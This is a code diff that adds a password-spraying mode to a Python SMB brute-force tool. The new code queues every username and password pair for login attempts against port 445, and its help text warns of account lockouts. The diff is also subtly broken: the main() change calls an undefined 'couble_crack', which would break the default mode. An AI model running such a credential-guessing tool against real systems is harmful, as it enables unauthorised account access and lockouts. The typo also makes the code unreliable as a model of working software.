@@ -38,6 +38,8 @@ def get_args():
             help = "Number of attack threads (default - 25)")
     parser.add_argument("-c", "--cont", default=False, action="store_true", \
             help = "Continue brute-forcing once one valid cred has been found (Default False).' ")
+    parser.add_argument("-s", "--spray", default=False, action="store_true", \
+            help = "Iterates user names first, carrying out a password spray. This is fast still, beware lockouts.' ")
     parser.add_argument("-T", "--timeout", default=5, type=int, \
         help = "SMB login timout, default 5s.' ")
     parser.add_argument("--port", default=445, type=int, \
@@ -85,11 +87,13 @@ def guesser(host, domain, port, login_q, timeout, kill_flag, struck_gold, done_q
             pass
         except BrokenPipeError as e:
             if rd:
+                print()
                 bc.warn("Error when trying credentials : {}\n{}".format(rd, e))
             else:
                 pass
         except SMBTimeout as e:
             if rd:
+                print()
                 bc.warn("Error when trying credentials : {}\n{}".format(rd, e))
             else:
                 pass
@@ -174,6 +178,40 @@ def double_crack(login_list, password_list, login_q, len_q):
     except KeyboardInterrupt:
         return
 
+def spray(login_list, password_list, login_q, len_q):
+    """Nested iteration of users and passwords, dishing out work accordingly"""
+
+    i = 0
+    j = 0
+    try:
+        n_login = file_len(login_list)
+        n_pass = file_len(password_list)
+        bc.info("Attempting login for {} users and {} passwords.".format(n_login, n_pass), True)
+        len_q.put(n_login*n_pass)
+        #For each line in the file, bang it in the queue
+        with open(password_list, 'r', encoding='latin-1') as pl:
+            for p in pl:
+                p = p.strip()
+                if not p: continue
+                i += 1
+                with open(login_list, 'r', encoding='latin-1') as ul:
+                    for u in ul:
+                        u = u.strip()
+                        if not u: continue
+                        j += 1
+                        login_q.put([u, p])
+    except UnicodeDecodeError as e:
+        bc.err("Error decoding at login_list line {} & password_list line {}\n{}.".format(i,j, e))
+        bc.warn("Skipping guess")
+    except BrokenPipeError as e:
+        bc.err("Error communicating between processes : {}".format(e))
+        bc.info("Continuing")
+    except ConnectionResetError as e:
+        bc.err("Error communicating between processes : {}".format(e))
+        bc.info("Continuing")
+    except KeyboardInterrupt:
+        return
+
 def single_crack(bruter, single, single_first, login_q, len_q):
     """Dishes out work bruting only one parameter, users OR passwords"""
 
@@ -204,6 +242,9 @@ def single_crack(bruter, single, single_first, login_q, len_q):
         bc.info("Continuing")
     except ConnectionResetError as e:
         bc.err("Error communicating between processes : {}".format(e))
+        bc.info("Continuing")
+    except EOFError as e:
+        bc.err("Error putting credentials in queue : {}".format(e))
         bc.info("Continuing")
     except KeyboardInterrupt:
         return
@@ -240,8 +281,9 @@ def main():
 
     #Now we have mode, carry out attack in whatever way specified
     if crack_mode == 'double':
+        double_mode = spray if args.spray else couble_crack
         #double_crack(args.login_list, args.password_list, login_q, len_q)
-        t = multiprocessing.Process(target=double_crack, args=(
+        t = multiprocessing.Process(target=double_mode, args=(
             args.login_list, args.password_list, login_q, len_q, ))
     elif crack_mode == 'user':
         #single_crack(args.login_list, args.password, False, login_q, len_q)
